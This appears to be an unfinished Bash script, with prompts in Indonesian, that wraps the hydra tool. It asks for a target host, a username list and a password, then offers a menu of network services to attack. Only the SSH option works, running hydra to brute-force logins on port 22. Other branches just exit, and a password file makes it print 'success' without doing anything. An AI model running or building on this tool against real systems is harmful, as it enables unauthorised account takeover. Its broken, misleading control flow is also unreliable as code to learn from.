alat_hydra(){
    host(){
        read -p "Masukkan nama host atau alamat ip yang ingin diserang: " h
        if [[ -z ${h} ]]; then
            echo "Kesalahan: nama host atau alamat ip tidak boleh kosong."
            host
        else
            nama_pengguna(){
                read -p "Masukkan nama pengguna atau file yang berisi daftar nama pengguna: " n
                if [[ -z ${n} ]]; then
                    echo "Kesalahan: nama pengguna atau file yang berisi daftar nama pengguna tidak boleh kosong."
                    nama_pengguna
                else
                    # daftar kata (wordlist)
                    if [[ -f ${n} ]]; then
                        kata_sandi(){
                            read -p "Masukkan kata sandi atau file yang berisi daftar kata sandi: " k
                            if [[ -z ${k} ]]; then
                                echo "Kesalahan: kata sandi atau file yang berisi daftar kata sandi tidak boleh kosong."
                                kata_sandi
                            else
                                daftar_layanan(){
                                    echo ""
                                    echo "(1) RDP"
                                    echo "(2) SSH"
                                    echo "(3) http(s)"
                                    echo "(4) SMB"
                                    echo "(5) pop3(s)"
                                    echo "(6) VNC"
                                    echo "(7) FTP"
                                    echo "(8) telnet"
                                    echo ""
                                }
                                if [[ -f ${k} ]]; then
                                    echo "berhasil"
                                    exit 0
                                else
                                    layanan(){
                                    daftar_layanan
                                        read -p "Masukkan layanan yang ingin diserang: " l
                                        if [[ -z ${l} ]]; then
                                            echo "Kesalahan: layanan tidak boleh kosong."
                                            layanan
                                        else
                                            if [[ ${l} == "1" ]]; then
                                                exit 0
                                            elif  [[ ${l} == "2" ]]; then
                                                hydra -L ${n} -p ${k} ${h} -s 22 -t 4
                                            else
                                                echo "Kesalahan: layanan ${l} tidak tersedia."
                                                layanan 
                                            fi
                                        fi
                                    }
                                    layanan 
                                fi
                            fi
                        }
                        kata_sandi
                    fi
                fi
            }
            nama_pengguna
        fi
    }
    host 
}

alat_hydra
